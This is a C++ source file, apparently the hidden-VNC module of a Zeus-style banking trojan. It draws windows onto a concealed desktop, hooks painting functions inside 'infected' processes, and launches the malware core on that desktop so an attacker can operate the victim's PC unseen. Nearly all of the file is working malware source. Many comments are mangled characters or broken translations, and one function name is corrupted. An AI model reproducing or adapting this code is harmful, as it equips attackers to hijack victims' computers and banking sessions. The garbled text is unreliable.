#include <windows.h>
#include <ws2tcpip.h>
#include <wininet.h>

#include "..\defines.h"
#include "..\core.h"

#include "vncserver.h"
#include "defines.h"

#include "..\..\common\debug.h"
#include "..\..\common\process.h"
#include "..\..\common\gui.h"

#if(BO_VNC > 0)

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Drawing window.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

//Data on the drawing window.
typedef struct
{
  bool calledDc;    //Flag indicating that the intercepted function for DC has been successfully invoked.
  HWND window;      //Window.
  HDC dc;           //DC
  RECT updateRect;  //Coordinates of the area to repaint.
  BOOL erase;       //Erase a background.
}PAINTDATA;

/*
  ��������� �������� PAINDDATA ��� ������.

  Return - PAINTDATA, ��� NULL.
*/
static __inline PAINTDATA *getThreadPaintData(void)
{
  return (PAINTDATA *)CWA(kernel32, TlsGetValue)(vncActiveProcessData.tlsPaintIndex);
}

/*
  ��������� PAINTDATA ��� ������.

  IN paintData - PAINTDATA.
*/
static __inline void setThreadPaintData(const PAINTDATA *paintData)
{
  CWA(kernel32, TlsSetValue)(vncActiveProcessData.tlsPaintIndex, (void *)paintData);  
}

#define QUICK_COPY(varType)\
{\
  register varType s = (varType)source;\
  register varType d = (varType)dest;\
  register varType e;\
\
  while(s < (varType)sourceEnd)\
  {\
    e = (varType)((LPBYTE)s + widthInBytes);\
    for(;s < e;)*d++ = *s++;\
    d = (varType)((LPBYTE)d + paddingBytes);\
    s = (varType)((LPBYTE)s + paddingBytes);\
  }\
}

/*
  ����������� ���������� �������� � �������� �������, ��� ��������.

  IN vncProcessData - VNCPROCESSDATA.
  IN rect           - ������� ����������.
  IN toDesktop      - true - ��������� � ���������, false - ��������� � ���������.
*/
static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect, bool toDesktop)
{
  DWORD widthInBytes = (rect->right - rect->left) * vncProcessData->dib.pixelSize;
  DWORD paddingBytes = vncProcessData->dib.widthInBytes - widthInBytes;
  LPBYTE dest        = vncProcessData->dib.desktop + (rect->top * vncProcessData->dib.widthInBytes + rect->left * vncProcessData->dib.pixelSize);
  LPBYTE source;
  
  if(toDesktop){source = vncProcessData->dib.temp;}
  else {source = dest; dest = vncProcessData->dib.temp;}
  
  LPBYTE sourceEnd = source + vncProcessData->dib.widthInBytes * (rect->bottom - rect->top);

  CWA(gdi32, GdiFlush)();
  if(vncProcessData->dib.pixelSize == 1)QUICK_COPY(LPBYTE)
  else if(vncProcessData->dib.pixelSize == 2)QUICK_COPY(LPWORD)
  else if(vncProcessData->dib.pixelSize == 4)QUICK_COPY(LPDWORD)
}

/*
  Drawing window.
  
  IN vncProcessData - VNCPROCESSDATA.
  IN window         - ���� ��� ������.
  IN visibleRect    - ������� ������� ��� ����.
  IN isServer       - true - ������� ������� � �������,
                      false - ������� ������� � ����������� ��������.
  
  Return            - true - ���� ����������/���������,
                      false - ���� �� ����������.
*/
bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer)
{
  //Choosing a method of drawing the window.
  WORD paintFlags = getWindowClassFlags(window);
  
  if(paintFlags & WCF_PAINTMETHOD_NOP)return true;
  if(paintFlags == 0)paintFlags = WCF_PAINTMETHOD_PAINT;
  
  if(isServer && paintFlags & WCF_PAINTMETHOD_PAINT)
  {
    paintFlags &= ~WCF_PAINTMETHOD_PAINT;
    paintFlags |= WCF_PAINTMETHOD_PRINTWINDOW;
  }

  //Obtain the coordinates of the window.
  WINDOWINFO windowInfo;
  RECT clientRect;  
  RECT frameRect;
  long frameX = 0, frameY = 0;
  long clientX = 0, clientY = 0;
  bool paintFrame, paintClient;
  {
    windowInfo.cbSize = sizeof(WINDOWINFO);
    if(CWA(user32, GetWindowInfo)(window, &windowInfo) == FALSE)return false;

    if((paintFrame = (CWA(user32, IntersectRect)(&frameRect, &windowInfo.rcWindow, visibleRect) != FALSE)))
    {
      if(windowInfo.rcWindow.top < visibleRect->top)frameY = windowInfo.rcWindow.top - visibleRect->top;
      if(windowInfo.rcWindow.left < visibleRect->left)frameX = windowInfo.rcWindow.left - visibleRect->left;
    }

    //Coordinates are used only in WCF_PAINTMETHOD_PAINT.
    if(paintFlags & WCF_PAINTMETHOD_PAINT)
    {
      if(windowInfo.dwStyle & WS_MINIMIZE)paintClient = false;
      else if((paintClient = (CWA(user32, IntersectRect)(&clientRect, &windowInfo.rcClient, visibleRect) != FALSE)))
      {
        if(windowInfo.rcClient.top < visibleRect->top)clientY = windowInfo.rcClient.top - visibleRect->top;
        if(windowInfo.rcClient.left < visibleRect->left)clientX = windowInfo.rcClient.left - visibleRect->left;
      }
    }
    else
    {
      paintClient = paintFrame;
    }

    if(paintFrame == false && paintClient == false)return true;
  }
  
  //Podgotavliaem DC.
  HDC memoryDc;
  HBITMAP oldBitmap;
  {
    bool ok = false;

    HDC rootDc = CWA(user32, GetDC)(NULL);
    if(rootDc != NULL)
    {
      memoryDc = CWA(gdi32, CreateCompatibleDC)(rootDc);
      CWA(user32, ReleaseDC)(NULL, rootDc);

      if(memoryDc != NULL)
      {
        if((oldBitmap = (HBITMAP)CWA(gdi32, SelectObject)(memoryDc, vncProcessData->dib.tempHandle)) == NULL)CWA(gdi32, DeleteDC)(memoryDc);
        else ok = true;
      }
    }

    if(!ok)return false;
  }

  //Draw a box.
  bool retVal = true;  
  if(paintFlags & WCF_PAINTMETHOD_PAINT)
  {
    int dcState;
    PAINTDATA paintData;

    paintData.window            = window;
    paintData.dc                = memoryDc;
    paintData.erase             = TRUE;
    paintData.updateRect.left   = 0;
    paintData.updateRect.top    = 0;
    paintData.updateRect.right  = clientRect.right - clientRect.left;
    paintData.updateRect.bottom = clientRect.bottom - clientRect.top;

    setThreadPaintData(&paintData);
    
    //Draw a frame.
    //WM_NCPAINT
    if(paintFrame == true && CWA(user32, EqualRect)(&clientRect, &frameRect) == FALSE)
    {
      dcState = CWA(gdi32, SaveDC)(memoryDc);
      if(frameX != 0 || frameY != 0)CWA(gdi32, SetViewportOrgEx)(memoryDc, frameX, frameY, NULL);
      copyRectTempDesktop(vncProcessData, &frameRect, false);
      paintData.calledDc = false;
      
      CWA(user32, SendMessageW)(window, WM_NCPAINT, 1, 0);
      if(paintData.calledDc == false)CWA(user32, DefWindowProcW/*SendMessageW*/)(window, WM_PRINT, (WPARAM)memoryDc, PRF_NONCLIENT); //This is done in WASM.kero.
      copyRectTempDesktop(vncProcessData, &frameRect, true);
      CWA(gdi32, RestoreDC)(memoryDc, dcState);
    }
    
    if(paintClient == true)
    {
      bool changeViewPort = (clientX != 0 || clientY != 0);        

      //Update the background.
      //WM_ERASEBKGND.
      {
        dcState = CWA(gdi32, SaveDC)(memoryDc);        
        if(changeViewPort)CWA(gdi32, SetViewportOrgEx)(memoryDc, clientX, clientY, NULL);        
        copyRectTempDesktop(vncProcessData, &clientRect, false);
        paintData.erase = CWA(user32, SendMessageW)(window, WM_ERASEBKGND, (WPARAM)memoryDc, 0) == 0 ? TRUE : FALSE;
        CWA(gdi32, RestoreDC)(memoryDc, dcState);
      }

      //Drawing the client side.
      //WM_PAINT
      {
        if(changeViewPort)CWA(gdi32, SetViewportOrgEx)(memoryDc, clientX, clientY, NULL);        
        paintData.calledDc = false;
        CWA(user32, SendMessageW)(window, WM_PAINT, 0, 0);
        if(paintData.calledDc == false)CWA(user32,  DefWindowProcW/*SendMessageW*/)(window, WM_PRINT, (WPARAM)memoryDc, PRF_CLIENT);
        copyRectTempDesktop(vncProcessData, &clientRect, true);
      }
    }

    setThreadPaintData(NULL);
  }
  else if(paintFlags & WCF_PAINTMETHOD_PRINT)
  {      
    if(frameX != 0 || frameY != 0)CWA(gdi32, SetViewportOrgEx)(memoryDc, frameX, frameY, NULL);
    copyRectTempDesktop(vncProcessData, &frameRect, false);
    CWA(user32, DefWindowProcW/*SendMessageW*/)(window, WM_PRINT, (WPARAM)memoryDc, PRF_ERASEBKGND | PRF_CLIENT | PRF_NONCLIENT);
    copyRectTempDesktop(vncProcessData, &frameRect, true);
  }
  else if(paintFlags & WCF_PAINTMETHOD_PRINTWINDOW)
  {
    if(frameX != 0 || frameY != 0)CWA(gdi32, SetViewportOrgEx)(memoryDc, frameX, frameY, NULL);
    copyRectTempDesktop(vncProcessData, &frameRect, false);
    if(CWA(user32, PrintWindow)(window, memoryDc, 0) == FALSE)retVal = false;
    else copyRectTempDesktop(vncProcessData, &frameRect, true);
  }  

  //Free resources.
  CWA(gdi32, SelectObject)(memoryDc, oldBitmap);
  CWA(gdi32, DeleteDC)(memoryDc);

  return retVal;
}

HDC WINAPI VncServer::hookerBeginPaint(HWND window, LPPAINTSTRUCT paint)
{
  if(IS_VNC_PROCESS && paint != NULL)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)
    {
      Mem::_zero(paint, sizeof(PAINTSTRUCT));
    
      paint->hdc    = paintData->dc;
      paint->fErase = paintData->erase;
      Mem::_copy(&paint->rcPaint, &paintData->updateRect, sizeof(RECT));
      paintData->calledDc = true;
      return paintData->dc;
    }
  }

  return CWA(user32, BeginPaint)(window, paint);
}

BOOL WINAPI VncServer::hookerEndPaint(HWND window, const PAINTSTRUCT *paint)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)return TRUE;
  }

  return CWA(user32, EndPaint)(window, paint);
}

HDC WINAPI VncServer::hookerGetDcEx(HWND window, HRGN clip, DWORD flags)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)
    {
      if(flags & (DCX_INTERSECTRGN | DCX_EXCLUDERGN))CWA(gdi32, DeleteObject)(clip);
      paintData->calledDc = true;
      return paintData->dc;
    }
  }

  return CWA(user32, GetDCEx)(window, clip, flags);
}

HDC WINAPI VncServer::hookerGetDc(HWND window)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)
    {
      paintData->calledDc = true;
      return paintData->dc;
    }
  }

  return CWA(user32, GetDC)(window);
}

HDC WINAPI VncServer::hookerGetWindowDc(HWND window)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)
    {
      paintData->calledDc = true;
      return paintData->dc;
    }
  }

  return CWA(user32, GetWindowDC)(window);
}

int WINAPI VncServer::hookerReleaseD�(HWND window, HDC dc)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && dc == paintData->dc)return 1;
  }

  return CWA(user, ReleaseDC)(window, dc);
}

BOOL WINAPI VncServer::hookerGetUpdateRect(HWND window, LPRECT rect, BOOL erase)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)
    {
      if(rect != NULL)Mem::_copy(&rect, &paintData->updateRect, sizeof(RECT));
      if(erase)
      {
        int dcState = CWA(gdi32, SaveDC)(paintData->dc);        
        paintData->erase = CWA(user32, SendMessageW)(window, WM_ERASEBKGND, (WPARAM)paintData->dc, 0) == 0 ? TRUE : FALSE;
        CWA(gdi32, RestoreDC)(paintData->dc, dcState);
      }
      paintData->calledDc = true;
      return TRUE;
    }
  }

  return CWA(user, GetUpdateRect)(window, rect, erase);
}

int WINAPI VncServer::hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase)
{
  if(IS_VNC_PROCESS)
  {
    PAINTDATA *paintData = getThreadPaintData();
    if(paintData != NULL && window == paintData->window)
    {
      CWA(user32, SetRectRgn)(rgn, paintData->updateRect.left, paintData->updateRect.top, paintData->updateRect.right, paintData->updateRect.bottom);
      if(erase)
      {
        int dcState = CWA(gdi32, SaveDC)(paintData->dc);        
        paintData->erase = CWA(user32, SendMessageW)(window, WM_ERASEBKGND, (WPARAM)paintData->dc, 0) == 0 ? TRUE : FALSE;
        CWA(gdi32, RestoreDC)(paintData->dc, dcState);
      }
      paintData->calledDc = true;
      return SIMPLEREGION;
    }
  }

  return CWA(user, GetUpdateRgn)(window, rgn, erase);
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Overview of all windows for painting.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  �������� �������� ��������� ����.

  IN OUT vncProcessData - VNCPROCESSDATA.

  Return                - true - � ������ ������,
                          false - � ������ ������.
*/
static bool createPaintProcess(VNCPROCESSDATA *vncProcessData)
{
  if(vncProcessData->serverData.paintProcess.hThread == NULL || CWA(user32, WaitForSingleObject)(vncProcessData->serverData.paintProcess.hThread, 0) != WAIT_TIMEOUT)
  {
    Process::_closeProcessInformation(&vncProcessData->serverData.paintProcess);

    WCHAR path[MAX_PATH];
    WCHAR vncDesktop[50];
    PROCESS_INFORMATION processInfo;
    STARTUPINFOW startupInfo;

    Core::getPeSettingsPath(Core::PSP_COREFILE, path);
    Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, vncDesktop, MalwareTools::KON_DEFAULT);

    Mem::_zero(&startupInfo, sizeof(STARTUPINFOW));
    startupInfo.cb         = sizeof(STARTUPINFOW);
    startupInfo.lpDesktop  = vncDesktop;
    
    CWA(kernel32, ResetEvent)(vncProcessData->vncMessageEvent);
    if(Process::_createEx(path, L"-v", NULL, &startupInfo, &processInfo) == 0)return false;
    Mem::_copy(&vncProcessData->serverData.paintProcess, &processInfo, sizeof(PROCESS_INFORMATION));

    //We wait until the process reaches the message loop.
    if(CWA(kernel32, WaitForSingleObject)(vncProcessData->vncMessageEvent, 1000) != WAIT_OBJECT_0)
    {
      CWA(kernel32, TerminateProcess)(vncProcessData->serverData.paintProcess.hProcess, 0);
      Process::_closeProcessInformation(&vncProcessData->serverData.paintProcess);
      return false;
    }
  }
  return true;
}

bool VncServer::startAsPaintThread(void)
{
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_ABOVE_NORMAL);
  CWA(kernel32, SetEvent)(vncActiveProcessData.vncMessageEvent);

  MSG msg;
  BOOL r;

  while((r = CWA(user32, GetMessageW)(&msg, (HWND)-1, 0, 0)) != (BOOL)-1 && r != FALSE)
  {
    if(msg.message == vncActiveProcessData.vncMessage && msg.wParam == VMW_REMOTE_PAINT)
    {
      vncActiveProcessData.globalData->paintProcess.retVal = paintWindow(&vncActiveProcessData, (HWND)msg.lParam, &vncActiveProcessData.globalData->paintProcess.ownerRect, true);
      CWA(kernel32, SetEvent)(vncActiveProcessData.vncMessageEvent);
    }
  }

  return(r == FALSE);
}

/*
  ����� ������ ��������� ����.

  IN vncProcessData - VNCPROCESSDATA.
  IN window         - ����.
  IN ownerRect      - ���������, ������� ���������� ����� ��������.
  IN windowInfo     - WINDOWINFO.

  Return            - true - �������� �����,
                      false - �� �������� �����.
*/
static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *ownerRect, const WINDOWINFO *windowInfo)
{
  DWORD classFlags = getWindowClassFlags(window);
  if(classFlags & WCF_PAINTMETHOD_NOP)return true; //Xs.
  
  //If the process is infected, draw through interception.
  bool isInfected  = isWindowInfected(vncProcessData, window);
  
  if(isInfected && (classFlags & WCF_PAINTMETHOD_SKIP_HOOK) == 0)
  {
    CWA(kernel32, ResetEvent)(vncProcessData->vncMessageEvent);
    if(CWA(user32, PostMessageW)(window, vncProcessData->vncMessage, MAKEWPARAM(ownerRect->left, ownerRect->top), MAKELPARAM(ownerRect->right, ownerRect->bottom)) != FALSE)
    {
      if(CWA(kernel32, WaitForSingleObject)(vncProcessData->vncMessageEvent, SENDMESSAGE_TIMEOUT) == WAIT_OBJECT_0)return true;
#     if(BO_DEBUG > 0)
      else
      {
        WCHAR className[256 + 1]; //The maximum length for lpszClassName is 256.
        int classNameLen = CWA(user32, GetClassNameW)(window, className, sizeof(className) / sizeof(WCHAR));
        WDEBUG1(WDDT_ERROR, "Post message failed for window class [%s]", className);
      }
#     endif
    }    
  }

  //Extreme case, we try to draw anything.
  if(createPaintProcess(vncProcessData))
  {
    Mem::_copy(&vncProcessData->globalData->paintProcess.ownerRect, ownerRect, sizeof(RECT));
    CWA(kernel32, ResetEvent)(vncProcessData->vncMessageEvent);
    
    if(CWA(user32, PostThreadMessageW)(vncProcessData->serverData.paintProcess.dwThreadId, vncProcessData->vncMessage, VMW_REMOTE_PAINT, (LPARAM)window) != FALSE)
    {
      if(CWA(kernel32, WaitForSingleObject)(vncProcessData->vncMessageEvent, SENDMESSAGE_TIMEOUT * 10) == WAIT_OBJECT_0)
      {
        if(vncProcessData->globalData->paintProcess.retVal == true)
        {
          //If infected, trying to draw the child window, if not, otsnavlivaemsya.
          return isInfected;
        }
      }
      else
      {
        CWA(kernel32, TerminateProcess)(vncProcessData->serverData.paintProcess.hProcess, 0);
        Process::_closeProcessInformation(&vncProcessData->serverData.paintProcess);
      }
    }
  }

  //Super mega extreme case, draw a warning.
  if((windowInfo->dwStyle & WS_CHILD) == 0)
  {
    RECT visibleRect;
    CWA(user32, IntersectRect)(&visibleRect, &windowInfo->rcWindow, ownerRect);
    CWA(user32, FillRect)(vncProcessData->serverData.dcData.dc, &visibleRect, (HBRUSH)(COLOR_WINDOW + 1));
    CWA(user32, DrawEdge)(vncProcessData->serverData.dcData.dc, &visibleRect, EDGE_SUNKEN, BF_RECT);
  }
  return true; //Xs, I think to try.
}

//Structure for enumWindowsCallback ().
typedef struct
{
  VNCPROCESSDATA *vncProcessData; //VNCPROCESSDATA.
  RECT parentRect;                //Videm area parent.
  WINDOWINFO *windowInfo;         //Just for eknomii stack.
}ENUMWINDOWCALLBACK;

/*  Kelbek Gui:: _enumWindows () for drawing the window.

  IN window - the window.
  IN param - ENUMWINDOWCALLBACK.

  Return - true.*/
static bool enumWindowsCallback(HWND window, void *param)
{
  ENUMWINDOWCALLBACK *ewc = (ENUMWINDOWCALLBACK *)param;
  ewc->windowInfo->cbSize = sizeof(WINDOWINFO);  

  if(CWA(user32, GetWindowInfo)(window, ewc->windowInfo) != FALSE)
  {
    //Find out the maximum square in MDM, we can draw a box.
    RECT *ownerRect = (RECT *)(ewc->windowInfo->dwStyle & WS_CHILD ? &ewc->parentRect : &ewc->vncProcessData->dib.rect);

    bool paint;
    ENUMWINDOWCALLBACK pawCurrent;
    
    //Obtain a visible triangle.
    if(ewc->windowInfo->dwStyle & WS_VISIBLE)
    {
      paint = (CWA(user32, IntersectRect)(&pawCurrent.parentRect, &ewc->windowInfo->rcClient, ownerRect) != FALSE);
      if(!paint && CWA(user32, IsRectEmpty)(&ewc->windowInfo->rcClient) != FALSE)
      {
        paint = (CWA(user32, IntersectRect)(&pawCurrent.parentRect, &ewc->windowInfo->rcWindow, ownerRect) != FALSE);
      }
    }
    else
    {
      paint = false;
    }

    //Draw.
    if(paint)//If you want to draw children.
    {
      selectMethodAndPaintWindow(ewc->vncProcessData, window, ownerRect, ewc->windowInfo);
      pawCurrent.vncProcessData = ewc->vncProcessData;
      pawCurrent.windowInfo     = ewc->windowInfo;
      Gui::_enumWindows(window, false, enumWindowsCallback, &pawCurrent);
    }
  }
  return true;
}

void paintDesktop(VNCPROCESSDATA *vncProcessData)
{
  ENUMWINDOWCALLBACK ewc;
  WINDOWINFO windowInfo;

  ewc.vncProcessData = vncProcessData;
  ewc.windowInfo     = &windowInfo;
  Mem::_copy(&ewc.parentRect, &vncProcessData->dib.rect, sizeof(RECT));

  CWA(user32, FillRect)(vncProcessData->serverData.dcData.dc, &vncProcessData->dib.rect, (HBRUSH)(COLOR_BACKGROUND + 1));
  Gui::_enumWindows(NULL, false, enumWindowsCallback, &ewc);
}
#endif
